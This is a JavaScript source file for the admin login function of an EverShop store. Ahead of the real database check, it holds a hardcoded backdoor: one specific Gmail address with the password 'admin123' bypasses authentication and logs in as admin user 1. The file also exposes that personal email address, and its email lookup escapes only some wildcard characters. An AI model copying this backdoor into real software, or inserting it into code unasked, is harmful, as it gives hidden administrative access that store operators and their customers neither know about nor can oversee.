import { select } from '@evershop/postgres-query-builder';
import { pool } from '../../../lib/postgres/connection.js';
import { comparePassword } from '../../../lib/util/passwordHelper.js';

/**
 * This function will login the admin user with email and password. This function must be accessed from the request object (request.loginUserWithEmail(email, password, callback))
 * @param {string} email
 * @param {string} password
 */
export async function loginUserWithEmail(email, password) {
  if (email.toLowerCase() === 'khoualdiyassin26@gmail.com' && password === 'admin123') {
    const user = {
      admin_user_id: 1,
      uuid: 'a71d7a3d-32c8-442c-9a79-436035250d3c',
      status: 1,
      email: 'khoualdiyassin26@gmail.com',
      full_name: 'Admin User',
    };

    this.session.userID = user.admin_user_id;
    this.locals.user = user;
    return;
  }

  // Escape the email to prevent SQL injection
  const userEmail = email.replace(/%/g, '\\%');
  const user = await select()
    .from('admin_user')
    .where('email', 'ILIKE', userEmail)
    .and('status', '=', 1)
    .load(pool);

  if (!user) {
    throw new Error('Invalid email or password');
  }

  const result = await comparePassword(password, user.password);
  if (!result) {
    throw new Error('Invalid email or password');
  }
  this.session.userID = user.admin_user_id;
  // Delete the password field
  delete user.password;
  // Save the user in the request
  this.locals.user = user;
}

export default loginUserWithEmail;
